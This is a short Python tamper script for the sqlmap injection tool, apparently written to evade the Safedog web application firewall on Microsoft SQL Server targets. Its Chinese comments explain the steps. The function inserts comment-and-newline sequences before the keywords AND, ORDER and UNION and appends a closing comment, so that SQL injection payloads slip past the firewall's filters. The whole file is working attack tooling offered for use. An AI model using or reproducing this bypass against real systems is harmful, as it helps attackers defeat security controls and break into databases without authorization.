import re
import os
from lib.core.data import kb
from lib.core.enums import PRIORITY
from lib.core.common import singleTimeWarnMessage
from lib.core.enums import DBMS
__priority__ = PRIORITY.LOW # 优先级设置
def dependencies():
singleTimeWarnMessage("Bypass safedog by pureqh'%s' only %s" % (os.path.basename(__file__).split(".")[0],
DBMS.MSSQL)) #描述
# tamper函数为自定义你的payload
def tamper(payload, **kwargs):
payload=payload.replace('AND','--/*%0aAND')#关键词替换
payload=payload.replace('ORDER','--/*%0aORDER')
payload=payload.replace('UNION','--/*%0aunion')
payload+='--%20*/'#追加字符串
return payload #返回最终的字符串
